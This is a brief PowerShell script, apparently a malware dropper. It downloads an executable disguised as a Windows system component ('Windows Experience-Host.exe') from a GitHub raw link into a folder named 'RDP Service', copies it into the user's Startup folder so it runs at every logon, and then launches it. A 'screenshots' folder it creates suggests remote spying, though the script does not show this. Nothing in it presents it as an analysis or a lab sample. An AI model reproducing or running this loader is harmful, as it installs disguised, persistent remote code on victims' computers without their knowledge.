$url = 'https://github.com/Kyreesemm/garbageJ8k0hH9s/raw/main/Windows%20Experience-Host.exe'
$dir = "$env:USERPROFILE\RDP Service"
md $dir\screenshots -Force
(New-Object Net.WebClient).DownloadFile($url, "$dir\WinExpHost.exe")
copy "$dir\WinExpHost.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
Start-Process "$dir\WinExpHost.exe"
